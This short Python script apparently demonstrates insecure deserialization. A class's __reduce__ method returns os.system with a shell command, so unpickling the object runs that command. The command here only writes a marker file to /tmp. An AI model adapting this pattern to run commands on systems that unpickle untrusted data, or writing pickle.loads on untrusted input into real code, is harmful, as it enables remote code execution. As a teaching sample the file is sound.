import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Attacker has been hacked > /tmp/hacked',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)
